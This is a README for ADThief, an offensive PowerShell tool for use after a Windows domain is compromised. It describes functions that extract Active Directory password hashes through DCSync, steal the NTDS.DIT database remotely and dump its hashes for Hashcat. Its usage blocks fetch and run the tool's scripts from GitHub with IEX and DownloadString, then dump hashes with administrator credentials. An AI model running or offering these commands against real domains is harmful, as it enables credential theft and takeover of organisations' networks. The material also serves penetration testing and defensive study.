# ADThief

ADThief is a PowerShell tool to exploit Active Directory database after compromising a Windows domain.

## Functions

```
Invoke-DCSync                   -   extracts domain accounts from Active Directory, including password hashes
Get-ADDatabase                  -   steals Active Directory database remotely
Dump-ADDatabase                 -   dumps domain accounts from an offline Active Directory database, including password hashes
Mount-ADDatabase                -   mounts an Active Directory database as a local LDAP server
Invoke-LdapSearch               -   searchs for domain objects in a mounted Active Directory database
```

## Requirements

The Invoke-DCSync and Get-ADDatabase functions require a privileged access to Active Directory, typically domain admin rights.
The Dump-ADDatabase and Mount-ADDatabase functions require admin rights on the local computer.

The Invoke-DCSync and Dump-ADDatabase functions must be launched on a computer with DSInternals PowerShell module installed. The output of these functions can be formatted using custom views provided by the DSInternals module to support different password cracking tools. The Utils.ps1 file contains a function `Add-DSAccountCustomViews` to add optional views 'SecretsDump' and 'SecretsDumpHistory'.

```
PS C:\> Install-Module DSInternals -Scope CurrentUser
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/ADThief/master/Utils.ps1')
PS C:\> Add-DSAccountCustomViews
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/ADThief/master/ADThief.ps1')
PS C:\> Invoke-DCSync -Server DC.ADATUM.CORP -Credential ADATUM\Administrator | Format-Custom -View SecretsDump
```

The Mount-ADDatabase function must be launched on a computer with AD LDS installed. Please make sure to back up the NTDS.DIT file before using the option 'AllowUpgrade'. 

```
PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM-Client" -Online
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/ADThief/master/ADThief.ps1')
PS C:\> Get-ADDatabase -Server DC.ADATUM.CORP -Credential ADATUM\Administrator
PS C:\> Dump-ADDatabase | Format-Custom -View HashcatNT | Out-File -Encoding ascii ADATUM.hashes
PS C:\> Mount-ADDatabase -AllowUpgrade -LdapPort 1389
PS C:\> Invoke-LdapSearch -Server localhost:1389 -LdapFilter "(&(userAccountControl:1.2.840.113556.1.4.803:=65536)(!userAccountControl:1.2.840.113556.1.4.803:=2))" -Properties * | Select sAMAccountName,servicePrincipalName
PS C:\> Umount-ADDatabase
```

## Credits

* https://blog.netspi.com/getting-started-wmi-weaponization-part-4/
* https://github.com/MichaelGrafnetter/DSInternals
